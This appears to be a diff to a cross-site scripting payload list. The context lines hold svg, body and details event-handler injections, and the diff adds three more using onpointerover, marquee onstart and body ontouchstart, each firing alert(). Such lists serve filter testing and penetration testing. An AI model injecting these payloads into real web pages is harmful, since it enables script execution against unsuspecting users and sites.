@@ -8,3 +8,6 @@ javascript:alert`1`
 </script><svg onload=alert`1`>
 <body onload=alert`1`>
 <details open ontoggle=alert`1`>
+<div onpointerover="alert(45)">MOVE HERE</div>
+<marquee onstart=alert(1)>
+<body ontouchstart=alert(1)>
